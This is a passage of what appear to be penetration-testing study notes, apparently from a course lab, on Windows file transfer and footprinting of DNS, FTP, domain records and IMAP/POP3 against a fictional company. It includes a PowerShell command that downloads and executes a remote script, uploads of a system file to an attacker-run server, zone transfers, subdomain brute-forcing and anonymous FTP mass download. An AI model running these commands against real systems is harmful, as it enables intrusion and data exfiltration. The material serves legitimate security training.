IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d &gt; hosts\n</code></pre></p> <pre><code>secops@kali[/kali]$ md5sum hosts \n\n3688374325b992def12793500307566d  hosts\n</code></pre>  PowerShell Web Uploads <p>PowerShell doesn't have a built-in function for upload operations, but we can use <code>Invoke-WebRequest</code> or <code>Invoke-RestMethod</code> to build our upload function. We'll also need a web server that accepts uploads.</p> <p>Installing a Configured WebServer with Upload <pre><code>secops@kali[/kali]$ pip3 install uploadserver\n\nCollecting upload server\n  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)\nInstalling collected packages: uploadserver\nSuccessfully installed uploadserver-2.0.1\n</code></pre></p> <pre><code>secops@kali[/kali]$ python3 -m uploadserver\n\nFile upload available at /upload\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n</code></pre> <p>PowerShell Script to Upload a File to Python Upload Server</p> <pre><code>PS C:\\xyz&gt; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\nPS C:\\xyz&gt; Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts\n\n[+] File Uploaded:  C:\\Windows\\System32\\drivers\\etc\\hosts\n[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373\n</code></pre> <p>PowerShell Base64 Web Upload</p> <p>Another way to use PowerShell and base64 encoded files for upload operations is by using <code>Invoke-WebRequest</code> or <code>Invoke-RestMethod</code> together with Netcat. We use Netcat to listen in on a port we specify and send the file as a <code>POST</code> request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.</p> <pre><code>PS C:\\xyz&gt; $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))\nPS C:\\xyz&gt; Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64\n</code></pre> <p>We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.</p> <pre><code>secops@kali[/kali]$ nc -lvnp 8000\n\nlistening on [any] 8000 ...\nconnect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923\nPOST / HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682\nContent-Type: application/x-www-form-urlencoded\nHost: 192.168.49.128:8000\nContent-Length: 1820\nConnection: Keep-Alive\n\nIyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo\n...SNIP...\n</code></pre> <pre><code>secops@kali[/kali]$ echo &lt;base64&gt; | base64 -d -w 0 &gt; hosts\n</code></pre>","title":"Windows"},{"location":"footprinting/dns/","text":"Server Type Description     <code>DNS Root Server</code> The root servers of the DNS are responsible for the top-level domains (<code>TLD</code>). As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The Internet Corporation for Assigned Names and Numbers (<code>ICANN</code>) coordinates the work of the root name servers. There are <code>13</code> such root servers around the globe.   <code>Authoritative Nameserver</code> Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client's query, the root name server takes over at that point.   <code>Non-authoritative Nameserver</code> Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying.   <code>Caching DNS Server</code> Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage.   <code>Forwarding Server</code> Forwarding servers perform only one function: they forward DNS queries to another DNS server.   <code>Resolver</code> Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router.    <p></p>","title":"DNS"},{"location":"footprinting/dns/#footprinting-the-service","text":"<p>Query DNS server if other name servers are known <pre><code>secops@kali[/kali]$ dig ns LEGALCORP.xyz @10.129.14.128\n\n; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; ns LEGALCORP.xyz @10.129.14.128\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 45010\n;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 4096\n; COOKIE: ce4d8681b32abaea0100000061475f73842c401c391690c7 (good)\n;; QUESTION SECTION:\n;LEGALCORP.xyz.             IN      NS\n\n;; ANSWER SECTION:\nLEGALCORP.xyz.      604800  IN      NS      ns.LEGALCORP.xyz.\n\n;; ADDITIONAL SECTION:\nns.LEGALCORP.xyz.   604800  IN      A       10.129.34.136\n\n;; Query time: 0 msec\n;; SERVER: 10.129.14.128#53(10.129.14.128)\n;; WHEN: So Sep 19 18:04:03 CEST 2021\n;; MSG SIZE  rcvd: 107\n</code></pre></p> <p>use <code>any</code> to view all available records <pre><code>secops@kali[/kali]$ dig any LEGALCORP.xyz @10.129.14.128\n\n; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; any LEGALCORP.xyz @10.129.14.128\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 7649\n;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 2\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 4096\n; COOKIE: 064b7e1f091b95120100000061476865a6026d01f87d10ca (good)\n;; QUESTION SECTION:\n;LEGALCORP.xyz.             IN      ANY\n\n;; ANSWER SECTION:\nLEGALCORP.xyz.      604800  IN      TXT     \"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all\"\nLEGALCORP.xyz.      604800  IN      TXT     \"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU\"\nLEGALCORP.xyz.      604800  IN      TXT     \"MS=ms97310371\"\nLEGALCORP.xyz.      604800  IN      SOA     LEGALCORP.xyz. root.LEGALCORP.xyz. 2 604800 86400 2419200 604800\nLEGALCORP.xyz.      604800  IN      NS      ns.LEGALCORP.xyz.\n\n;; ADDITIONAL SECTION:\nns.LEGALCORP.xyz.   604800  IN      A       10.129.34.136\n\n;; Query time: 0 msec\n;; SERVER: 10.129.14.128#53(10.129.14.128)\n;; WHEN: So Sep 19 18:42:13 CEST 2021\n;; MSG SIZE  rcvd: 437\n</code></pre></p> <p>DIG - AXFR Zone Transfer <pre><code>secops@kali[/kali]$ dig axfr LEGALCORP.xyz @10.129.14.128\n\n; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; axfr LEGALCORP.xyz @10.129.14.128\n;; global options: +cmd\nLEGALCORP.xyz.      604800  IN      SOA     LEGALCORP.xyz. root.LEGALCORP.xyz. 2 604800 86400 2419200 604800\nLEGALCORP.xyz.      604800  IN      TXT     \"MS=ms97310371\"\nLEGALCORP.xyz.      604800  IN      TXT     \"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU\"\nLEGALCORP.xyz.      604800  IN      TXT     \"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all\"\nLEGALCORP.xyz.      604800  IN      NS      ns.LEGALCORP.xyz.\napp.LEGALCORP.xyz.  604800  IN      A       10.129.18.15\ninternal.LEGALCORP.xyz. 604800 IN   A       10.129.1.6\nmail1.LEGALCORP.xyz. 604800 IN      A       10.129.18.201\nns.LEGALCORP.xyz.   604800  IN      A       10.129.34.136\nLEGALCORP.xyz.      604800  IN      SOA     LEGALCORP.xyz. root.LEGALCORP.xyz. 2 604800 86400 2419200 604800\n;; Query time: 4 msec\n;; SERVER: 10.129.14.128#53(10.129.14.128)\n;; WHEN: So Sep 19 18:51:19 CEST 2021\n;; XFR size: 9 records (messages 1, bytes 520)\n</code></pre></p> <p>DIG - AXFR Zone Transfer - Internal <pre><code>secops@kali[/kali]$ dig axfr internal.LEGALCORP.xyz @10.129.14.128\n\n; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; axfr internal.LEGALCORP.xyz @10.129.14.128\n;; global options: +cmd\ninternal.LEGALCORP.xyz. 604800 IN   SOA     LEGALCORP.xyz. root.LEGALCORP.xyz. 2 604800 86400 2419200 604800\ninternal.LEGALCORP.xyz. 604800 IN   TXT     \"MS=ms97310371\"\ninternal.LEGALCORP.xyz. 604800 IN   TXT     \"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU\"\ninternal.LEGALCORP.xyz. 604800 IN   TXT     \"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all\"\ninternal.LEGALCORP.xyz. 604800 IN   NS      ns.LEGALCORP.xyz.\ndc1.internal.LEGALCORP.xyz. 604800 IN A     10.129.34.16\ndc2.internal.LEGALCORP.xyz. 604800 IN A     10.129.34.11\nmail1.internal.LEGALCORP.xyz. 604800 IN A   10.129.18.200\nns.internal.LEGALCORP.xyz. 604800 IN A      10.129.34.136\nvpn.internal.LEGALCORP.xyz. 604800 IN A     10.129.1.6\nws1.internal.LEGALCORP.xyz. 604800 IN A     10.129.1.34\nws2.internal.LEGALCORP.xyz. 604800 IN A     10.129.1.35\nwsus.internal.LEGALCORP.xyz. 604800 IN A    10.129.18.2\ninternal.LEGALCORP.xyz. 604800 IN   SOA     LEGALCORP.xyz. root.LEGALCORP.xyz. 2 604800 86400 2419200 604800\n;; Query time: 0 msec\n;; SERVER: 10.129.14.128#53(10.129.14.128)\n;; WHEN: So Sep 19 18:53:11 CEST 2021\n;; XFR size: 15 records (messages 1, bytes 664)\n</code></pre></p> <p>The individual <code>A</code> records with the hostnames can also be found out with the help of a brute-force attack. <pre><code>secops@kali[/kali]$ for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.LEGALCORP.xyz @10.129.14.128 | grep -v ';\\|SOA' | sed -r '/^\\s*$/d' | grep $sub | tee -a subdomains.txt;done\n\nns.LEGALCORP.xyz.   604800  IN      A       10.129.34.136\nmail1.LEGALCORP.xyz. 604800 IN      A       10.129.18.201\napp.LEGALCORP.xyz.  604800  IN      A       10.129.18.15\n</code></pre></p> <p>Using DNSenum <pre><code>secops@kali[/kali]$ dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt LEGALCORP.xyz\n\ndnsenum VERSION:1.2.6\n\n-----   LEGALCORP.xyz   -----\n\n\nHost's addresses:\n__________________\n\n\n\nName Servers:\n______________\n\nns.LEGALCORP.xyz.                    604800   IN    A        10.129.34.136\n\n\nMail (MX) Servers:\n___________________\n\n\n\nTrying Zone Transfers and getting Bind Versions:\n_________________________________________________\n\nunresolvable name: ns.LEGALCORP.xyz at /usr/bin/dnsenum line 900 thread 1.\n\nTrying Zone Transfer for LEGALCORP.xyz on ns.LEGALCORP.xyz ...\nAXFR record query failed: no nameservers\n\n\nBrute forcing with /home/cryanight/Pentesting/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:\n_______________________________________________________________________________________________________\n\nns.LEGALCORP.xyz.                    604800   IN    A        10.129.34.136\nmail1.LEGALCORP.xyz.                 604800   IN    A        10.129.18.201\napp.LEGALCORP.xyz.                   604800   IN    A        10.129.18.15\nns.LEGALCORP.xyz.                    604800   IN    A        10.129.34.136\n\n...SNIP...\ndone.\n</code></pre></p>","title":"Footprinting the Service"},{"location":"footprinting/domain_information/","text":"Online Presence <p>Source to find more subdomains: crt.sh</p> <p>Output the results in JSON format</p> <pre><code>secops@kali[/kali]$ curl -s https://crt.sh/\\?q\\=LEGALCORP.com\\&amp;output\\=json | jq .\n\n[\n  {\n    \"issuer_ca_id\": 23451835427,\n    \"issuer_name\": \"C=US, O=Let's Encrypt, CN=R3\",\n    \"common_name\": \"matomo.LEGALCORP.com\",\n    \"name_value\": \"matomo.LEGALCORP.com\",\n    \"id\": 50815783237226155,\n    \"entry_timestamp\": \"2021-08-21T06:00:17.173\",\n    \"not_before\": \"2021-08-21T05:00:16\",\n    \"not_after\": \"2021-11-19T05:00:15\",\n    \"serial_number\": \"03abe9017d6de5eda90\"\n  },\n  { ... SNIP ...\n</code></pre> <p>Filtered by the unique subdomains: <pre><code>secops@kali[/kali]$ curl -s https://crt.sh/\\?q\\=LEGALCORP.com\\&amp;output\\=json | jq . | grep name | cut -d\":\" -f2 | grep -v \"CN=\" | cut -d'\"' -f2 | awk '{gsub(/\\\\n/,\"\\n\");}1;' | sort -u\n\naccount.ttn.LEGALCORP.com\nblog.LEGALCORP.com\nbots.LEGALCORP.com\nconsole.ttn.LEGALCORP.com\nct.LEGALCORP.com\ndata.ttn.LEGALCORP.com\n*.LEGALCORP.com\nLEGALCORP.com\nintegrations.ttn.LEGALCORP.com\niot.LEGALCORP.com\n</code></pre></p> <p>Identify the hosts directly accessible from the Internet and not hosted by third-party providers.  <pre><code>secops@kali[/kali]$ for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep LEGALCORP.com | cut -d\" \" -f1,4;done\n\nblog.LEGALCORP.com 10.129.24.93\nLEGALCORP.com 10.129.27.33\nmatomo.LEGALCORP.com 10.129.127.22\nwww.LEGALCORP.com 10.129.127.33\ns3-website-us-west-2.amazonaws.com 10.129.95.250\n</code></pre></p> <p>Generate a list of IP addresses with a minor adjustment to the <code>cut</code> command and run them through Shodan.</p> <p>Shodan can be used to find devices and systems permanently connected to the Internet like Internet of Things (IoT)</p> <p>Shodan - IP List <pre><code>secops@kali[/kali]$ for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep LEGALCORP.com | cut -d\" \" -f4 &gt;&gt; ip-addresses.txt;done\nsecops@kali[/kali]$ for i in $(cat ip-addresses.txt);do shodan host $i;done\n\n10.129.24.93\nCity:                    Berlin\nCountry:                 Germany\nOrganization:            LEGALCORP\nUpdated:                 2021-09-01T09:02:11.370085\nNumber of open ports:    2\n\nPorts:\n     80/tcp nginx \n    443/tcp nginx \n\n10.129.27.33\nCity:                    Berlin\nCountry:                 Germany\nOrganization:            LEGALCORP\nUpdated:                 2021-08-30T22:25:31.572717\nNumber of open ports:    3\n\nPorts:\n     22/tcp OpenSSH (7.6p1 Ubuntu-4ubuntu0.3)\n     80/tcp nginx \n    443/tcp nginx \n        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, -TLSv1.3, TLSv1.2\n        |-- Diffie-Hellman Parameters:\n                Bits:          2048\n                Generator:     2\n</code></pre></p> <p>Display all the available DNS records where we might find more hosts.</p> <pre><code>secops@kali[/kali]$ dig any LEGALCORP.com\n\n; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; any LEGALCORP.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 52058\n;; flags: qr rd ra; QUERY: 1, ANSWER: 17, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 65494\n;; QUESTION SECTION:\n;LEGALCORP.com.             IN      ANY\n\n;; ANSWER SECTION:\nLEGALCORP.com.      300     IN      A       10.129.27.33\nLEGALCORP.com.      300     IN      A       10.129.95.250\nLEGALCORP.com.      3600    IN      MX      1 aspmx.l.google.com.\nLEGALCORP.com.      3600    IN      MX      10 aspmx2.googlemail.com.\nLEGALCORP.com.      3600    IN      MX      10 aspmx3.googlemail.com.\nLEGALCORP.com.      3600    IN      MX      5 alt1.aspmx.l.google.com.\nLEGALCORP.com.      3600    IN      MX      5 alt2.aspmx.l.google.com.\nLEGALCORP.com.      21600   IN      NS      ns.inwx.net.\nLEGALCORP.com.      21600   IN      SOA     ns.inwx.net. hostmaster.inwx.net. 2021072600 10800 3600 604800 3600\n\n;; Query time: 332 msec\n;; SERVER: 127.0.0.53#53(127.0.0.53)\n;; WHEN: Mi Sep 01 18:27:22 CEST 2021\n;; MSG SIZE  rcvd: 940\n</code></pre>  Cloud Resources <p>Google Search for AWS <pre><code>intext:pdf inurl:amazonaws.com\n</code></pre></p> <p>Google Search for Azure <pre><code>intext:pdf inurl:blob.core.windows.net\n</code></pre></p> <p>Third-party providers  domain.glass  GrayHatWarfare</p>","title":"Domain Information"},{"location":"footprinting/ftp/","text":"<p>Recursive Listing <pre><code>ftp&gt; ls -R\n\n---&gt; PORT 10,10,14,4,222,149\n200 PORT command successful. Consider using PASV.\n---&gt; LIST -R\n150 Here comes the directory listing.\n.:\n-rw-rw-r--    1 ftp      ftp      8138592 Sep 14 16:54 Calender.pptx\ndrwxrwxr-x    2 ftp      ftp         4096 Sep 14 17:03 Clients\ndrwxrwxr-x    2 ftp      ftp         4096 Sep 14 16:50 Documents\ndrwxrwxr-x    2 ftp      ftp         4096 Sep 14 16:50 Employees\n-rw-rw-r--    1 ftp      ftp           41 Sep 14 16:45 Important Notes.txt\n-rw-------    1 ftp      ftp            0 Sep 15 14:57 testupload.txt\n\n./Clients:\ndrwx------    2 ftp      ftp          4096 Sep 16 18:04 HackTheBox\ndrwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:00 LEGALCORP\n</code></pre></p> <p>Download All Available Files <pre><code>secops@kali[/kali]$ wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136\n\n--2021-09-19 14:45:58--  ftp://anonymous:*password*@10.129.14.136/                                         \n           =&gt; \u201810.129.14.136/.listing\u2019                                                                     \nConnecting to 10.129.14.136:21... connected.                                                               \nLogging in as anonymous ... Logged in!\n==&gt; SYST ... done.    ==&gt; PWD ... done.\n==&gt; TYPE I ... done.  ==&gt; CWD not needed.\n==&gt; PORT ... done.    ==&gt; LIST ... done.                                                                 \n12.12.1.136/.listing           [ &lt;=&gt;                                  ]     466  --.-KB/s    in 0s       \n\n2021-09-19 14:45:58 (65,8 MB/s) - \u201810.129.14.136/.listing\u2019 saved [466]                                     \n--2021-09-19 14:45:58--  ftp://anonymous:*password*@10.129.14.136/Calendar.pptx   \n           =&gt; \u201810.129.14.136/Calendar.pptx\u2019                                       \n==&gt; CWD not required.                                                           \n==&gt; SIZE Calendar.pptx ... done.                                                                                                                            \n==&gt; PORT ... done.    ==&gt; RETR Calendar.pptx ... done.       \n\n...SNIP...\n\n2021-09-19 14:45:58 (48,3 MB/s) - \u201810.129.14.136/Employees/.listing\u2019 saved [119]\n\nFINISHED --2021-09-19 14:45:58--\nTotal wall clock time: 0,03s\nDownloaded: 15 files, 1,7K in 0,001s (3,02 MB/s)\n</code></pre></p> <pre><code>secops@kali[/kali]$ tree .\n\n.\n\u2514\u2500\u2500 10.129.14.136\n    \u251c\u2500\u2500 Calendar.pptx\n    \u251c\u2500\u2500 Clients\n    \u2502   \u2514\u2500\u2500 LEGALCORP\n    \u2502       \u251c\u2500\u2500 appointments.xlsx\n    \u2502       \u251c\u2500\u2500 contract.docx\n    \u2502       \u251c\u2500\u2500 meetings.txt\n    \u2502       \u2514\u2500\u2500 proposal.pptx\n    \u251c\u2500\u2500 Documents\n    \u2502   \u251c\u2500\u2500 appointments-template.xlsx\n    \u2502   \u251c\u2500\u2500 contract-template.docx\n    \u2502   \u2514\u2500\u2500 contract-template.pdf\n    \u251c\u2500\u2500 Employees\n    \u2514\u2500\u2500 Important Notes.txt\n\n5 directories, 9 files\n</code></pre> <p>Upload File <pre><code>ftp&gt; put testupload.txt \n\nlocal: testupload.txt remote: testupload.txt\n---&gt; PORT 10,10,14,4,184,33\n200 PORT command successful. Consider using PASV.\n---&gt; STOR testupload.txt\n150 Ok to send data.\n226 Transfer complete.\n</code></pre></p> <p>Footprinting the Service <pre><code>secops@kali[/kali]$ sudo nmap -sV -p21 -sC -A 10.129.14.136\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-16 18:12 CEST\nNmap scan report for 10.129.14.136\nHost is up (0.00013s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.0.8 or later\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| -rwxrwxrwx    1 ftp      ftp       8138592 Sep 16 17:24 Calendar.pptx [NSE: writeable]\n| drwxrwxrwx    4 ftp      ftp          4096 Sep 16 17:57 Clients [NSE: writeable]\n| drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:05 Documents [NSE: writeable]\n| drwxrwxrwx    2 ftp      ftp          4096 Sep 16 17:24 Employees [NSE: writeable]\n| -rwxrwxrwx    1 ftp      ftp            41 Sep 16 17:24 Important Notes.txt [NSE: writeable]\n|_-rwxrwxrwx    1 ftp      ftp             0 Sep 15 14:57 testupload.txt [NSE: writeable]\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to 10.10.14.4\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 2\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n</code></pre></p> <p>Service Interaction <pre><code>secops@kali[/kali]$ nc -nv 10.129.14.136 21\n</code></pre></p> <pre><code>secops@kali[/kali]$ telnet 10.129.14.136 21\n</code></pre> <p>FTP server runs with TLS/SSL encryption <pre><code>secops@kali[/kali]$ openssl s_client -connect 10.129.14.136:21 -starttls ftp\n\nCONNECTED(00000003)                                                                                      \nCan't use SSL_get_servername                        \ndepth=0 C = US, ST = California, L = Sacramento, O = LEGALCORP, OU = Dev, CN = master.LEGALCORP.xyz, emailAddress = admin@LEGALCORP.xyz\nverify error:num=18:self signed certificate\nverify return:1\n\ndepth=0 C = US, ST = California, L = Sacramento, O = LEGALCORP, OU = Dev, CN = master.LEGALCORP.xyz, emailAddress = admin@LEGALCORP.xyz\nverify return:1\n---                                                 \nCertificate chain\n 0 s:C = US, ST = California, L = Sacramento, O = LEGALCORP, OU = Dev, CN = master.LEGALCORP.xyz, emailAddress = admin@LEGALCORP.xyz\n\n i:C = US, ST = California, L = Sacramento, O = LEGALCORP, OU = Dev, CN = master.LEGALCORP.xyz, emailAddress = admin@LEGALCORP.xyz\n---\n\nServer certificate\n\n-----BEGIN CERTIFICATE-----\n\nMIIENTCCAx2gAwIBAgIUD+SlFZAWzX5yLs2q3ZcfdsRQqMYwDQYJKoZIhvcNAQEL\n...SNIP...\n</code></pre></p>","title":"FTP"},{"location":"footprinting/imap_pop3/","text":"Command Description     <code>1 LOGIN username password</code> User's login.   <code>1 LIST \"\" *</code> Lists all directories.   <code>1 CREATE \"INBOX\"</code> Creates a mailbox with a specified name.   <code>1 DELETE \"INBOX\"</code> Deletes a mailbox.   <code>1 RENAME \"ToRead\" \"Important\"</code> Renames a mailbox.   <code>1 LSUB \"\" *</code> Returns a subset of names from the set of names that the User has declared as being <code>active</code> or <code>subscribed</code>.   <code>1 SELECT INBOX</code> Selects a mailbox so that messages in the mailbox can be accessed.   <code>1 UNSELECT INBOX</code> Exits the selected mailbox.   <code>1 FETCH &lt;ID&gt; all</code> Retrieves data associated with a message in the mailbox.   <code>1 CLOSE</code> Removes all messages with the <code>Deleted</code> flag set.   <code>1 LOGOUT</code> Closes the connection with the IMAP server.","title":"Imap Commands"},{"location":"footprinting/imap_pop3/#pop3-commands","text":"Command Description     <code>USER username</code> Identifies the user.   <code>PASS password</code> Authentication of the user using its password.   <code>STAT</code> Requests the number of saved emails from the server.   <code>LIST</code> Requests from the server the number and size of all emails.   <code>RETR id</code> Requests the server to deliver the requested email by ID.   <code>DELE id</code> Requests the server to delete the requested email by ID.   <code>CAPA</code> Requests the server to display the server capabilities.   <code>RSET</code> Requests the server to reset the transmitted information.   <code>QUIT</code> Closes the connection with the POP3 server.","title":"POP3 Commands"},{"location":"footprinting/imap_pop3/#footprinting-the-service","text":"<p>By default, ports <code>110</code>, <code>143</code>, <code>993</code>, and <code>995</code> are used for IMAP and POP3. The two higher ports use <code>TLS/SSL</code> to encrypt the communication between client and server.</p> <pre><code>secops@kali[/kali]$ sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 22:09 CEST\nNmap scan report for 10.129.14.128\nHost is up (0.00026s latency).\n\nPORT    STATE SERVICE  VERSION\n110/tcp open  pop3     Dovecot pop3d\n|_pop3-capabilities: AUTH-RESP-CODE SASL STLS TOP UIDL RESP-CODES CAPA PIPELINING\n| ssl-cert: Subject: commonName=mail1.LEGALCORP.xyz/organizationName=LEGALCORP/stateOrProvinceName=California/countryName=US\n| Not valid before: 2021-09-19T19:44:58\n|_Not valid after:  2295-07-04T19:44:58\n143/tcp open  imap     Dovecot imapd\n|_imap-capabilities: more have post-login STARTTLS Pre-login capabilities LITERAL+ LOGIN-REFERRALS OK LOGINDISABLEDA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1\n| ssl-cert: Subject: commonName=mail1.LEGALCORP.xyz/organizationName=LEGALCORP/stateOrProvinceName=California/countryName=US\n| Not valid before: 2021-09-19T19:44:58\n|_Not valid after:  2295-07-04T19:44:58\n993/tcp open  ssl/imap Dovecot imapd\n|_imap-capabilities: more have post-login OK capabilities LITERAL+ LOGIN-REFERRALS Pre-login AUTH=PLAINA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1\n| ssl-cert: Subject: commonName=mail1.LEGALCORP.xyz/organizationName=LEGALCORP/stateOrProvinceName=California/countryName=US\n| Not valid before: 2021-09-19T19:44:58\n|_Not valid after:  2295-07-04T19:44:58\n995/tcp open  ssl/pop3 Dovecot pop3d\n|_pop3-capabilities: AUTH-RESP-CODE USER SASL(PLAIN) TOP UIDL RESP-CODES CAPA PIPELINING\n| ssl-cert: Subject: commonName=mail1.LEGALCORP.xyz/organizationName=LEGALCORP/stateOrProvinceName=California/countryName=US\n| Not valid before: 2021-09-19T19:44:58\n|_Not valid after:  2295-07-04T19:44:58\nMAC Address: 00:00:00:00:00:00 (VMware)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.74 seconds\n</code></pre> <p>We can see that the common name is <code>mail1.LEGALCORP.xyz</code>, and the email server belongs to the organization <code>LEGALCORP</code>, which is located in California.</p> <p>If we successfully figure out the access credentials for one of the employees, an attacker could log in to the 